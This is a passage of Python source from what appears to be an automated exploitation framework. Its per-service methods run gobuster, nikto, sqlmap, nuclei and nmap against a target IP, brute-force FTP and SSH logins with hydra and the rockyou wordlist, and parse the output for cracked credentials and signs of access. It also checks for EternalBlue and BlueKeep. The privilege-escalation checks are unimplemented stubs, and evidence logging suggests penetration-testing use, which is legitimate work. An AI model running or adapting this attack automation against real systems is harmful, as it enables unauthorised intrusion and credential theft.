            results['vulnerabilities_found'].extend(generic_results['vulnerabilities'])
        
        # Check for credentials
        if 'credentials' in generic_results:
            results['credentials_found'].extend(generic_results['credentials'])
        
        # Check for access
        if generic_results.get('access_gained'):
            results['access_gained'] = True
    
    def _attempt_privilege_escalation(self, port: int) -> Dict:
        """Attempt privilege escalation after gaining initial access"""
        self.logger.info("Attempting privilege escalation...")
        
        privesc_results = {
            'attempted': True,
            'success': False,
            'methods_tried': [],
            'vulnerabilities_found': []
        }
        
        # Common privilege escalation techniques
        techniques = [
            self._check_sudo_privileges,
            self._check_suid_binaries,
            self._check_kernel_exploits,
            self._check_service_misconfigurations,
            self._check_scheduled_tasks,
            self._check_weak_permissions
        ]
        
        for technique in techniques:
            try:
                result = technique()
                privesc_results['methods_tried'].append(result['method'])
                if result.get('success'):
                    privesc_results['success'] = True
                    privesc_results['vulnerabilities_found'].append(result)
            except Exception as e:
                self.logger.error(f"Privilege escalation technique failed: {e}")
        
        return privesc_results
    
    def _check_sudo_privileges(self) -> Dict:
        """Check for sudo privileges"""
        return {'method': 'sudo_check', 'success': False, 'details': 'Not implemented'}
    
    def _check_suid_binaries(self) -> Dict:
        """Check for SUID binaries"""
        return {'method': 'suid_check', 'success': False, 'details': 'Not implemented'}
    
    def _check_kernel_exploits(self) -> Dict:
        """Check for kernel exploits"""
        return {'method': 'kernel_exploits', 'success': False, 'details': 'Not implemented'}
    
    def _check_service_misconfigurations(self) -> Dict:
        """Check for service misconfigurations"""
        return {'method': 'service_misconfig', 'success': False, 'details': 'Not implemented'}
    
    def _check_scheduled_tasks(self) -> Dict:
        """Check for scheduled task vulnerabilities"""
        return {'method': 'scheduled_tasks', 'success': False, 'details': 'Not implemented'}
    
    def _check_weak_permissions(self) -> Dict:
        """Check for weak file/directory permissions"""
        return {'method': 'weak_permissions', 'success': False, 'details': 'Not implemented'}
    
    def _exploit_http(self, port: int, service_info: Dict) -> Dict:
        """Exploit HTTP service"""
        results = {
            'service': 'http',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting HTTP service on port {port}")
        
        # 1. Directory/file enumeration with gobuster
        gobuster_result = self._run_gobuster(port, service_info)
        results['tools_used'].append('gobuster')
        results['total_attempts'] += 1
        if gobuster_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(gobuster_result.get('vulnerabilities', []))
        
        # 2. Web vulnerability scanning with nikto
        nikto_result = self._run_nikto(port, service_info)
        results['tools_used'].append('nikto')
        results['total_attempts'] += 1
        if nikto_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(nikto_result.get('vulnerabilities', []))
        
        # 3. SQL injection testing with sqlmap
        sqlmap_result = self._run_sqlmap(port, service_info)
        results['tools_used'].append('sqlmap')
        results['total_attempts'] += 1
        if sqlmap_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(sqlmap_result.get('vulnerabilities', []))
            if sqlmap_result.get('access_gained'):
                results['access_gained'] = True
        
        # 4. Common web exploits with nuclei
        nuclei_result = self._run_nuclei_web(port, service_info)
        results['tools_used'].append('nuclei')
        results['total_attempts'] += 1
        if nuclei_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(nuclei_result.get('vulnerabilities', []))
        
        return results
    
    def _exploit_https(self, port: int, service_info: Dict) -> Dict:
        """Exploit HTTPS service"""
        # HTTPS uses same techniques as HTTP plus SSL-specific tests
        results = self._exploit_http(port, service_info)
        results['service'] = 'https'
        
        # Add SSL-specific tests
        ssl_result = self._test_ssl_vulnerabilities(port, service_info)
        results['tools_used'].append('sslscan')
        results['total_attempts'] += 1
        if ssl_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(ssl_result.get('vulnerabilities', []))
        
        return results
    
    def _exploit_ftp(self, port: int, service_info: Dict) -> Dict:
        """Exploit FTP service"""
        results = {
            'service': 'ftp',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting FTP service on port {port}")
        
        # 1. Anonymous FTP access test
        anon_result = self._test_ftp_anonymous(port, service_info)
        results['tools_used'].append('ftp_anonymous')
        results['total_attempts'] += 1
        if anon_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'anonymous_access',
                'severity': 'medium',
                'description': 'Anonymous FTP access enabled'
            })
        
        # 2. FTP brute force
        brute_result = self._brute_force_ftp(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 3. FTP bounce attack
        bounce_result = self._test_ftp_bounce(port, service_info)
        results['tools_used'].append('nmap')
        results['total_attempts'] += 1
        if bounce_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].append({
                'type': 'ftp_bounce',
                'severity': 'high',
                'description': 'FTP bounce attack possible'
            })
        
        return results
    
    def _exploit_ssh(self, port: int, service_info: Dict) -> Dict:
        """Exploit SSH service"""
        results = {
            'service': 'ssh',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting SSH service on port {port}")
        
        # 1. SSH version enumeration and vulnerability check
        version_result = self._check_ssh_version(port, service_info)
        results['tools_used'].append('ssh_version')
        results['total_attempts'] += 1
        if version_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(version_result.get('vulnerabilities', []))
        
        # 2. SSH brute force
        brute_result = self._brute_force_ssh(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 3. SSH key enumeration
        key_result = self._enumerate_ssh_keys(port, service_info)
        results['tools_used'].append('ssh_user_enum')
        results['total_attempts'] += 1
        if key_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(key_result.get('vulnerabilities', []))
        
        return results
    
    def _exploit_smb(self, port: int, service_info: Dict) -> Dict:
        """Exploit SMB/NetBIOS service"""
        results = {
            'service': 'smb',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting SMB service on port {port}")
        
        # 1. SMB enumeration with enum4linux
        enum_result = self._enumerate_smb(port, service_info)
        results['tools_used'].append('enum4linux')
        results['total_attempts'] += 1
        if enum_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(enum_result.get('vulnerabilities', []))
        
        # 2. SMB null session test
        null_result = self._test_smb_null_session(port, service_info)
        results['tools_used'].append('smbclient')
        results['total_attempts'] += 1
        if null_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'null_session',
                'severity': 'medium',
                'description': 'SMB null session enabled'
            })
        
        # 3. SMB brute force
        brute_result = self._brute_force_smb(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 4. EternalBlue exploit check
        eternalblue_result = self._test_eternalblue(port, service_info)
        results['tools_used'].append('nmap')
        results['total_attempts'] += 1
        if eternalblue_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'eternalblue',
                'severity': 'critical',
                'description': 'EternalBlue vulnerability (MS17-010)'
            })
        
        return results
    
    def _exploit_msrpc(self, port: int, service_info: Dict) -> Dict:
        """Exploit Microsoft RPC service"""
        results = {
            'service': 'msrpc',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting MSRPC service on port {port}")
        
        # 1. RPC enumeration
        enum_result = self._enumerate_rpc(port, service_info)
        results['tools_used'].append('rpcclient')
        results['total_attempts'] += 1
        if enum_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(enum_result.get('vulnerabilities', []))
        
        # 2. RPC null session
        null_result = self._test_rpc_null_session(port, service_info)
        results['tools_used'].append('rpcclient')
        results['total_attempts'] += 1
        if null_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'rpc_null_session',
                'severity': 'medium',
                'description': 'RPC null session enabled'
            })
        
        return results
    
    def _exploit_mysql(self, port: int, service_info: Dict) -> Dict:
        """Exploit MySQL database service"""
        results = {
            'service': 'mysql',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting MySQL service on port {port}")
        
        # 1. MySQL version enumeration
        version_result = self._check_mysql_version(port, service_info)
        results['tools_used'].append('mysql_version')
        results['total_attempts'] += 1
        if version_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(version_result.get('vulnerabilities', []))
        
        # 2. MySQL brute force
        brute_result = self._brute_force_mysql(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 3. MySQL UDF exploitation
        udf_result = self._test_mysql_udf(port, service_info)
        results['tools_used'].append('mysql_udf')
        results['total_attempts'] += 1
        if udf_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'mysql_udf',
                'severity': 'high',
                'description': 'MySQL UDF exploitation possible'
            })
        
        return results
    
    def _exploit_postgresql(self, port: int, service_info: Dict) -> Dict:
        """Exploit PostgreSQL database service"""
        results = {
            'service': 'postgresql',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting PostgreSQL service on port {port}")
        
        # 1. PostgreSQL brute force
        brute_result = self._brute_force_postgresql(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 2. PostgreSQL privilege escalation
        privesc_result = self._test_postgresql_privesc(port, service_info)
        results['tools_used'].append('psql')
        results['total_attempts'] += 1
        if privesc_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'privilege_escalation',
                'severity': 'high',
                'description': 'PostgreSQL privilege escalation possible'
            })
        
        return results
    
    def _exploit_mssql(self, port: int, service_info: Dict) -> Dict:
        """Exploit Microsoft SQL Server service"""
        results = {
            'service': 'mssql',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting MSSQL service on port {port}")
        
        # 1. MSSQL brute force
        brute_result = self._brute_force_mssql(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 2. MSSQL xp_cmdshell test
        cmdshell_result = self._test_mssql_xp_cmdshell(port, service_info)
        results['tools_used'].append('mssqlclient')
        results['total_attempts'] += 1
        if cmdshell_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'xp_cmdshell',
                'severity': 'critical',
                'description': 'MSSQL xp_cmdshell enabled'
            })
        
        return results
    
    def _exploit_rdp(self, port: int, service_info: Dict) -> Dict:
        """Exploit RDP service"""
        results = {
            'service': 'rdp',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting RDP service on port {port}")
        
        # 1. RDP brute force
        brute_result = self._brute_force_rdp(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 2. BlueKeep vulnerability test
        bluekeep_result = self._test_bluekeep(port, service_info)
        results['tools_used'].append('nmap')
        results['total_attempts'] += 1
        if bluekeep_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'bluekeep',
                'severity': 'critical',
                'description': 'BlueKeep vulnerability (CVE-2019-0708)'
            })
        
        return results
    
    def _exploit_vnc(self, port: int, service_info: Dict) -> Dict:
        """Exploit VNC service"""
        results = {
            'service': 'vnc',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Exploiting VNC service on port {port}")
        
        # 1. VNC brute force
        brute_result = self._brute_force_vnc(port, service_info)
        results['tools_used'].append('hydra')
        results['total_attempts'] += 1
        if brute_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['credentials'].extend(brute_result.get('credentials', []))
        
        # 2. VNC no authentication test
        noauth_result = self._test_vnc_no_auth(port, service_info)
        results['tools_used'].append('vncviewer')
        results['total_attempts'] += 1
        if noauth_result.get('success'):
            results['successful_attempts'] += 1
            results['access_gained'] = True
            results['vulnerabilities'].append({
                'type': 'no_authentication',
                'severity': 'critical',
                'description': 'VNC no authentication required'
            })
        
        return results
    
    def _exploit_unknown(self, port: int, service_info: Dict) -> Dict:
        """Generic exploitation for unknown services"""
        results = {
            'service': 'unknown',
            'port': port,
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities': [],
            'credentials': [],
            'access_gained': False,
            'tools_used': []
        }
        
        self.logger.info(f"Attempting generic exploitation on unknown service at port {port}")
        
        # 1. Generic nuclei scan
        nuclei_result = self._run_nuclei_generic(port, service_info)
        results['tools_used'].append('nuclei')
        results['total_attempts'] += 1
        if nuclei_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(nuclei_result.get('vulnerabilities', []))
        
        # 2. Banner grabbing and version detection
        banner_result = self._grab_banner(port, service_info)
        results['tools_used'].append('netcat')
        results['total_attempts'] += 1
        if banner_result.get('success'):
            results['successful_attempts'] += 1
            results['vulnerabilities'].extend(banner_result.get('vulnerabilities', []))
        
        return results

    # ==================== AUXILIARY TOOL METHODS ====================
    
    def _run_gobuster(self, port: int, service_info: Dict) -> Dict:
        """Run gobuster for directory enumeration"""
        try:
            wordlist = CONFIG['wordlists']['dirs']
            if not os.path.exists(wordlist):
                wordlist = '/usr/share/wordlists/dirb/common.txt'
            
            cmd = [
                'gobuster', 'dir',
                '-u', f'http://{self.target_ip}:{port}',
                '-w', wordlist,
                '-t', '50',
                '--timeout', '10s',
                '-q'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerabilities = []
            if result.returncode == 0 and result.stdout:
                # Parse gobuster output for interesting directories
                for line in result.stdout.split('\n'):
                    if '(Status:' in line and ('200' in line or '301' in line or '302' in line):
                        path = line.split()[0]
                        vulnerabilities.append({
                            'type': 'directory_found',
                            'severity': 'low',
                            'description': f'Directory found: {path}',
                            'path': path
                        })
            
            self.evidence.collect_evidence(
                'directory_enumeration', 'gobuster', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities,
                'output': result.stdout
            }
            
        except Exception as e:
            self.logger.error(f"Gobuster failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _run_nikto(self, port: int, service_info: Dict) -> Dict:
        """Run nikto for web vulnerability scanning with intelligent port handling"""
        try:
            # First verify if there's actually a web service on non-standard ports
            if port != 80 and port != 443:
                if not self._verify_web_service(port, service_info):
                    return {
                        'success': False, 
                        'error': f'No web service detected on port {port}',
                        'vulnerabilities': []
                    }
            
            # Build nikto command - use default port 80 without specifying if it's port 80
            if port == 80:
                cmd = [
                    'nikto',
                    '-h', self.target_ip,  # No port specification for default port 80
                    '-Format', 'txt',
                    '-timeout', '10'
                ]
            else:
                cmd = [
                    'nikto',
                    '-h', f'{self.target_ip}:{port}',
                    '-Format', 'txt',
                    '-timeout', '10'
                ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            vulnerabilities = []
            if result.stdout:
                # Parse nikto output for vulnerabilities
                for line in result.stdout.split('\n'):
                    if '+ ' in line and any(keyword in line.lower() for keyword in 
                                         ['vulnerable', 'exploit', 'backdoor', 'shell', 'injection']):
                        vulnerabilities.append({
                            'type': 'web_vulnerability',
                            'severity': 'medium',
                            'description': line.strip(),
                            'tool': 'nikto'
                        })
            
            self.evidence.collect_evidence(
                'web_vulnerability_scan', 'nikto', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities,
                'output': result.stdout
            }
            
        except Exception as e:
            self.logger.error(f"Nikto failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _verify_web_service(self, port: int, service_info: Dict) -> bool:
        """Verify if there's actually a web service running on the specified port"""
        try:
            # Check service info first
            if service_info:
                service_name = service_info.get('name', '').lower()
                product = service_info.get('product', '').lower()
                
                # Known web service indicators
                web_indicators = ['http', 'https', 'web', 'apache', 'nginx', 'iis', 'tomcat', 'jetty']
                if any(indicator in service_name or indicator in product for indicator in web_indicators):
                    return True
            
            # Try HTTP connection test
            import socket
            import time
            
            protocols_to_test = ['http', 'https'] if port == 443 else ['http']
            
            for protocol in protocols_to_test:
                try:
                    # Simple HTTP request test
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((self.target_ip, port))
                    sock.close()
                    
                    if result == 0:  # Connection successful
                        # Try a basic HTTP request
                        import urllib.request
                        import urllib.error
                        
                        url = f'{protocol}://{self.target_ip}:{port}'
                        try:
                            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                            response = urllib.request.urlopen(req, timeout=10)
                            
                            # Check if response looks like HTTP
                            content_type = response.headers.get('content-type', '').lower()
                            if any(web_type in content_type for web_type in ['html', 'text', 'json', 'xml']):
                                return True
                                
                        except (urllib.error.HTTPError, urllib.error.URLError):
                            # Even HTTP errors indicate a web server is present
                            return True
                        except:
                            continue
                            
                except Exception:
                    continue
            
            return False
            
        except Exception as e:
            self.logger.debug(f"Web service verification failed for port {port}: {e}")
            # If verification fails, assume it's a web service to be safe
            return True
    
    def _run_sqlmap(self, port: int, service_info: Dict) -> Dict:
        """Run sqlmap for SQL injection testing"""
        try:
            # Basic SQL injection test on common parameters
            base_url = f'http://{self.target_ip}:{port}'
            test_urls = [
                f'{base_url}/?id=1',
                f'{base_url}/index.php?id=1',
                f'{base_url}/login.php?user=admin'
            ]
            
            vulnerabilities = []
            access_gained = False
            
            for url in test_urls:
                cmd = [
                    'sqlmap',
                    '-u', url,
                    '--batch',
                    '--level', '1',
                    '--risk', '1',
                    '--timeout', '10',
                    '--retries', '1'
                ]
                
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    if 'vulnerable' in result.stdout.lower():
                        vulnerabilities.append({
                            'type': 'sql_injection',
                            'severity': 'high',
                            'description': f'SQL injection found at {url}',
                            'url': url
                        })
                        
                        # Try to get database access
                        if 'database' in result.stdout.lower():
                            access_gained = True
                            
                except subprocess.TimeoutExpired:
                    continue
            
            self.evidence.collect_evidence(
                'sql_injection_test', 'sqlmap', 'sqlmap_batch_test',
                f'Tested {len(test_urls)} URLs', len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities,
                'access_gained': access_gained
            }
            
        except Exception as e:
            self.logger.error(f"SQLMap failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _run_nuclei_web(self, port: int, service_info: Dict) -> Dict:
        """Run nuclei for web-specific vulnerabilities"""
        try:
            cmd = [
                'nuclei',
                '-u', f'http://{self.target_ip}:{port}',
                '-t', '/root/nuclei-templates/http/',
                '-severity', 'medium,high,critical',
                '-timeout', '10',
                '-retries', '1',
                '-json'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerabilities = []
            if result.stdout:
                for line in result.stdout.split('\n'):
                    if line.strip():
                        try:
                            vuln_data = json.loads(line)
                            vulnerabilities.append({
                                'type': 'nuclei_finding',
                                'severity': vuln_data.get('info', {}).get('severity', 'medium'),
                                'description': vuln_data.get('info', {}).get('name', 'Unknown vulnerability'),
                                'template': vuln_data.get('template-id', ''),
                                'matched_at': vuln_data.get('matched-at', '')
                            })
                        except json.JSONDecodeError:
                            continue
            
            self.evidence.collect_evidence(
                'nuclei_web_scan', 'nuclei', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"Nuclei web scan failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _test_ssl_vulnerabilities(self, port: int, service_info: Dict) -> Dict:
        """Test SSL/TLS vulnerabilities"""
        try:
            cmd = ['sslscan', f'{self.target_ip}:{port}']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            vulnerabilities = []
            if result.stdout:
                output_lower = result.stdout.lower()
                
                # Check for common SSL vulnerabilities
                if 'sslv2' in output_lower and 'enabled' in output_lower:
                    vulnerabilities.append({
                        'type': 'ssl_vulnerability',
                        'severity': 'high',
                        'description': 'SSLv2 enabled (deprecated protocol)'
                    })
                
                if 'sslv3' in output_lower and 'enabled' in output_lower:
                    vulnerabilities.append({
                        'type': 'ssl_vulnerability',
                        'severity': 'medium',
                        'description': 'SSLv3 enabled (deprecated protocol)'
                    })
                
                if 'weak cipher' in output_lower or 'null cipher' in output_lower:
                    vulnerabilities.append({
                        'type': 'ssl_vulnerability',
                        'severity': 'medium',
                        'description': 'Weak SSL ciphers detected'
                    })
            
            self.evidence.collect_evidence(
                'ssl_scan', 'sslscan', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"SSL scan failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _test_ftp_anonymous(self, port: int, service_info: Dict) -> Dict:
        """Test FTP anonymous access"""
        try:
            cmd = ['ftp', '-n', self.target_ip, str(port)]
            
            # FTP commands to test anonymous access
            ftp_commands = "user anonymous anonymous\nls\nquit\n"
            
            result = subprocess.run(
                cmd, input=ftp_commands, capture_output=True, text=True, timeout=30
            )
            
            success = ('230' in result.stdout or 'logged in' in result.stdout.lower())
            
            self.evidence.collect_evidence(
                'ftp_anonymous_test', 'ftp', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"FTP anonymous test failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _brute_force_ftp(self, port: int, service_info: Dict) -> Dict:
        """Brute force FTP credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            # Use common wordlists if configured ones don't exist
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                'ftp'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                # Parse hydra output for credentials
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'ftp'
                            })
            
            self.evidence.collect_evidence(
                'ftp_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"FTP brute force failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _test_ftp_bounce(self, port: int, service_info: Dict) -> Dict:
        """Test FTP bounce attack"""
        try:
            cmd = [
                'nmap',
                '-p', str(port),
                '--script', 'ftp-bounce',
                self.target_ip
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            success = 'bounce working' in result.stdout.lower()
            
            self.evidence.collect_evidence(
                'ftp_bounce_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"FTP bounce test failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _check_ssh_version(self, port: int, service_info: Dict) -> Dict:
        """Check SSH version for known vulnerabilities"""
        try:
            cmd = ['ssh', '-o', 'ConnectTimeout=5', f'{self.target_ip}', '-p', str(port)]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            vulnerabilities = []
            version_info = result.stderr  # SSH version usually in stderr
            
            # Check for known vulnerable versions
            if 'OpenSSH' in version_info:
                if any(vuln_version in version_info for vuln_version in ['2.', '3.', '4.', '5.', '6.6']):
                    vulnerabilities.append({
                        'type': 'ssh_version_vulnerability',
                        'severity': 'medium',
                        'description': f'Potentially vulnerable SSH version detected: {version_info.strip()}'
                    })
            
            self.evidence.collect_evidence(
                'ssh_version_check', 'ssh', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"SSH version check failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _brute_force_ssh(self, port: int, service_info: Dict) -> Dict:
        """Brute force SSH credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            # Use common wordlists if configured ones don't exist
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'ssh'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'ssh'
                            })
            
            self.evidence.collect_evidence(
                'ssh_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"SSH brute force failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _enumerate_ssh_keys(self, port: int, service_info: Dict) -> Dict:
        """Enumerate SSH keys and users"""
        try:
            cmd = [
                'nmap',
                '-p', str(port),
                '--script', 'ssh-auth-methods,ssh-hostkey',
                self.target_ip
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            vulnerabilities = []
            if 'publickey' in result.stdout:
                vulnerabilities.append({
                    'type': 'ssh_key_auth',
                    'severity': 'low',
                    'description': 'SSH public key authentication enabled'
                })
            
            if 'password' in result.stdout:
                vulnerabilities.append({
                    'type': 'ssh_password_auth',
                    'severity': 'low',
                    'description': 'SSH password authentication enabled'
                })
            
            self.evidence.collect_evidence(
                'ssh_enumeration', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"SSH enumeration failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _enumerate_smb(self, port: int, service_info: Dict) -> Dict:
        """Enumerate SMB shares and information with caching to avoid duplicates"""
        try:
            # Check if we already ran enum4linux for this target
            cache_key = f"enum4linux_{self.target_ip}"
            if cache_key in self._smb_enumeration_cache:
                self.logger.info(f"Using cached enum4linux results for {self.target_ip} (avoiding duplicate execution)")
                cached_result = self._smb_enumeration_cache[cache_key].copy()
                
                # Update evidence collection with cache info
                self.evidence.collect_evidence(
                    'smb_enumeration', 'enum4linux', f'enum4linux -a {self.target_ip} (cached)',
                    f'Using cached results from previous execution on port {cached_result.get("original_port", "unknown")}',
                    cached_result.get('success', False)
                )
                
                return cached_result
            
            # Run enum4linux for the first time
            cmd = ['enum4linux', '-a', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
